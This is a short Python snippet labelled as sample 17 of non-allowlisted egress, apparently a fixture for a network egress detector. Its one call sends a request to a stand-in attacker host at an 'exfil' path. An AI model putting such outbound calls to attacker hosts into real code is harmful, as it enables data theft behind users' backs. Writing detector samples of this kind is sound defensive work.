# Sample 17: requests.Session() non-allowlisted egress.
import requests
s = requests.Session()
s.get("https://evil.example.com/exfil")
